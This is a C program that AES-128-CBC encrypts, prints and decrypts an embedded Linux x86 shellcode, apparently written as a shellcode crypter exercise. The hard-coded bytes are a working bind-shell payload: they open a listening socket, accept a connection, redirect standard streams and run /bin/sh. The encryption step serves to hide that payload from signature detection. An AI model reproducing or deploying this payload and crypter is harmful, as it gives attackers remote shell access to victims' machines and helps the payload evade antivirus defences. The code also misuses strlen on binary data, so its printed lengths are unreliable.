#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
 
int main( )
{
        /* Set Key */
        unsigned char key[16];
        strcpy((char *) key,"012345678912345");
	
        /* Shellcode to encrypt */
	unsigned char shellcode[] = \
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
"\xb0\x66\x43\x52\x66\x68\x82\x35\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1"
"\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52"
"\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x92"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50"
"\x89\xe2\xb0\x0b\xcd\x80";
	
        /* Print original shellcode for verification */
        printf("[*] Original Shellcode: \n");
        for (int i = 0; i < strlen(shellcode); i++) {

                printf("\\x%x", shellcode[i]);
        }
        printf("\n[*] Original Shellcode Length:  %d\n", strlen(shellcode));

	/* Init vector */
	unsigned char iv[AES_BLOCK_SIZE];
	memset(iv, 0x00, AES_BLOCK_SIZE);
	
	/* Buffers for Encryption and Decryption */
	unsigned char ciphertext[sizeof(shellcode)];
	unsigned char dec_out[sizeof(shellcode)];
	
	/* AES-128 bit CBC Encryption */
	
        printf("\n[*] Encrypting Shellcode with key: %s \n", key);

        AES_KEY enc_key, dec_key;
	AES_set_encrypt_key(key, sizeof(key)*8, &enc_key);
	AES_cbc_encrypt(shellcode, ciphertext, sizeof(shellcode), &enc_key, iv, AES_ENCRYPT);

        printf("[*] Encrypted Shellcode:\n");
    
        for (int i = 0; i < strlen(ciphertext); i++) {
    
                printf("\\x%x", ciphertext[i]);
        }
        printf("\n[*] Encrypted Shellcode Length:  %d\n", strlen(ciphertext));

	/* AES-128 bit CBC Decryption */
	memset(iv, 0x00, AES_BLOCK_SIZE); 
	AES_set_decrypt_key(key, sizeof(key)*8, &dec_key); // Size of key is in bits
	AES_cbc_encrypt(ciphertext, dec_out, sizeof(shellcode), &dec_key, iv, AES_DECRYPT);
	
	printf("\n[*] Decrypting Shellcode... \n");
        printf("[*] Recovered Original Shellcode: \n");

        for (int i = 0; i < strlen(dec_out); i++) {
 
                printf("\\x%x", dec_out[i]);

        }  
		
        printf("\n[*] Done \n");	

        return 0;
}
 
